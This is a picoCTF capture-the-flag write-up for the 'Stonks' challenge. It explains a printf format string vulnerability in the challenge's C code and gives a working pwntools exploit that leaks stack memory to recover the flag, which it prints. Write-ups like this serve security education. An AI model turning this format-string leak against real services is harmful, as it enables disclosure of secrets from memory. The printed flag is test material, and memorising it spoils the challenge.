# Stonks

**Author:** [yairp03](https://github.com/yairp03)  
**Category:** Binary Exploitation  
**Points:** 20

# Challenge

## Description

I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](./vuln.c) `nc mercury.picoctf.net 33411`

## Source

[vuln.c](./vuln.c) (C source)

# Solution

In this challenge, we are given a [C source file](./vuln.c), and it's name suggests that it has a vulnerability. Looking at the code, we see this part:

```c
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);
```

The program asks for a user input, and then passes it using printf. This is vulnerable to a [format string attack](/Guides/Vulnerabilities/Format%20String%20Vulnerability.md). Leveraging this vulnerability, we can print out values from the stack. The flag is saved somewhere on the stack, so if we print out enough values, we should be able to find it. Let's do it using python and the [pwntools](/Guides/Tools/pwntools.md) library:

```python
from pwn import *

# Establish connection
conn = remote('mercury.picoctf.net', 33411)

# Route to the exploit
conn.sendlineafter('2) View my portfolio\n', '1')
conn.recvuntil('What is your API token?\n')

# Exploit
conn.send('%x' + '.%x' * 40 + '\n')

# Route to the leak
conn.recvuntil('Buying stonks with token:\n')
# Get the data
stack = conn.recvline(False).decode()

# Parse the data
result = b''
for h in stack.split('.'):
    result += p32(int(h, 16))

# Extract the flag
flag = result[result.find(b'picoCTF{'):result.find(b'}') + 1].decode()

# Print the flag
print(flag)
```

The code is connect to the server, routes to the exploit, and then sends the exploit. The exploit is a format string that prints out 41 values from the stack (each is 4 bytes long). Then, the code routes to the leak, and gets the data. In this part, the variable `stack` has something that looks like this:

```python
> print(stack)
b'8f6c3f0.804b000.80489c3.f7f44d80.ffffffff.1.8f6a160.f7f52110.f7f44dc7.0.8f6b180.a.8f6c3d0.8f6c3f0.6f636970.7b465443.306c5f49.345f7435.6d5f6c6c.306d5f79.5f79336e.63343261.36613431.fffa007d.f7f7faf8.f7f52440.a7531300.1.0.f7de1ce9.f7f530c0.f7f445c0.f7f44000.fffaadd8.f7dd268d.f7f445c0.8048eca.fffaade4.0.f7f66f09.804b000'
```

We can see that after 14 values, we have the value `6f636970`, which is ascii for `ocip`, which is `pico` backwards. This is the start of the flag. We use the function `p32` from pwntools to convert each value to a 4-byte string, and then concatenate them. Finally, we extract the flag from the data:

```python
> print(flag)
picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}
```

**The Flag:** `picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}`
